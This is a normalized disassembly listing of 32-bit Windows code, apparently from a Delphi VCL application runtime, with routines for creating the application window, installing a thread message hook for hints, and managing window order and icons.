je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_45e4f8
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41d400
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41d400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c154
cmp [ rw-data ] 0x0
je r-xdata
sub_45c18c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_45c1ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_45c328 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_45c39c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45baf4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_413de4
mov dl [ ebp - 0x1 ]
call sub_45c1ec
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_45bae0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_413c88
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_413e60
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_413de4
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_45c18c
test al al
je r-xdata
inc esi
sub_45c4e8
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45baf4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_45bae0
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_45c540
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_45c4e8
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45c5ba
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_45c39c
pop ecx
push ebp
mov al 0x2
call sub_45c39c
pop ecx
push ebp
mov al 0x3
call sub_45c39c
pop ecx
push ebp
mov al 0x4
call sub_45c39c
pop ecx
push ebp
mov al 0x5
call sub_45c39c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032a0
retn
sub_45c5c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c15c
xor eax eax
push ebp
push sub_45c641
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45c540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_45c164
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45c65c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_404074
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_4040c8
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_45c6b4
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_403740#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_45eb00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45c708
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_43c670
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_45eb7c
sub_45c764
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45dc1c
sub_45c7a8
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_45c764
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_45c708
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_45c81c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_45c878
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_45c8a8
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_45c8d0
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_45c878
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_45c8a8
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_45c8a8
sub_45c910
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a0e4
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45dfe8
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_423990
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_423d60
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45e780
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c478
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45e1e0
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c4a0
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408730
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4042e4
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_45e95c
mov eax ebx
call sub_45f320
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_45cc18
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_45caf9
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_45f330
mov [ esp + 0x4 ] esi
mov [ esp ] sub_45dfe8
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_45e1e0
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_45eb7c
xor edx edx
mov eax esi
call sub_45e4f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a130
push esi
push sub_45d04c
mov eax esi
call sub_45ddd4
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4056e0
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_4032a0
mov eax [ esi + 0x90 ]
call sub_4032a0
mov eax [ esi + 0x98 ]
call sub_4032a0
test bl bl
jle r-xdata
call sub_41b20c
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_45cc18
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45cdb9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cdc0
lea eax [ ebp - 0x2c ]
call sub_404074
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_45d198
call sub_41b174
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404534
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406ba8
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_404074
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_45d89c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45d89c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_45cdc8
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_45bafc
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_45ce28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_413c88
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_4445f8
cmp ebx eax
je r-xdata
sub_45ce98
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_45ce28
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413de4
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45cfb0
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_413de4
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45d04c
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c740
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_45c008
mov eax [ rw-data ]
call sub_45c650
sub_45d0a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d101
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d108
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_40426c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_45d110
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_45d14c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45d89c
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_45d198
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403740#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45d04c
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_45e2b8
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_413de4
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
